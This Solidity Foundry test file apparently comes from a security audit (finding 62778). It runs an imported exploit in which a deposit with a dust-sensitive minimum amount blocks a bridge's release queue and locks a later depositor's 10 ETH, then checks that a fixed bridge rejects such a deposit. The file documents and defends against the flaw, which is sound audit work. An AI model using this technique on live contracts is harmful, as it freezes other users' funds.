// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, BridgeFixed} from
    "./62778-malicious-deposit-with-dust-sensitive-minamount-can-cause-de.sol";

contract Payee {
    receive() external payable {}
}

contract Finding62778Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_dust_min_amount_locks_later_deposit() public {
        Exploit e = new Exploit();
        uint256 total = e.ALICE_AMT() + e.BOB_AMT() + e.CAROL_AMT();
        e.run{value: total}();

        assertEq(address(e.alice()).balance, 10 ether, "alice was released");
        assertEq(address(e.carol()).balance, 0, "carol received nothing");
        assertEq(address(e.bridge()).balance, e.BOB_AMT() + e.CAROL_AMT(), "carol's 10 ETH still escrowed");
        assertEq(e.bridge().head(), 1, "cursor stuck on the poison deposit");
        assertEq(e.stuck().balanceOf(SINK), 10 ether, "10 ETH locked");
    }

    function test_control_rejects_min_above_dust() public {
        BridgeFixed bridge = new BridgeFixed();
        Payee alice = new Payee();
        Payee carol = new Payee();
        uint256 bobAmt = 1_0000123 * 1e11;
        uint256 bobMin = 1_0000120 * 1e11;

        bool queued = true;
        try bridge.bridgeOut{value: bobAmt}(address(this), bobAmt, bobMin) {
            queued = true;
        } catch {
            queued = false;
        }
        assertFalse(queued, "poison deposit rejected");
        assertEq(bridge.queueLength(), 0, "queue empty");

        bridge.bridgeOut{value: 10 ether}(address(alice), 10 ether, 0);
        bridge.bridgeOut{value: 10 ether}(address(carol), 10 ether, 0);
        bridge.batchRelease(2);
        assertEq(address(alice).balance, 10 ether, "alice paid");
        assertEq(address(carol).balance, 10 ether, "carol paid");
        assertEq(address(bridge).balance, 0, "escrow cleared");
    }
}
